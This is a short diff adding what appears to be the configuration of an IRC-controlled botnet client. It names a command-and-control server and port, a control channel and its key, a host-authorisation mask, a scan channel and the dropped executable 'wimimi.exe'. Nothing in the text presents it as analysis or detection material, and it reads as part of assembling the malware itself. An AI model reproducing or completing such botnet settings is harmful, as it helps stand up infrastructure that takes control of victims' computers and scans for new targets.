@@ -1,0 +1,10 @@
+Bot ID: essek
+Servers(1):
+    - neoam.theneo.info
+Port: 1863
+Server Pass: 
+Channel: #!dns
+Channel Key: yarrak
+Host Auth: *!*@fbi.gov
+Scan Channel: #!dns#
+Filename: wimimi.exe
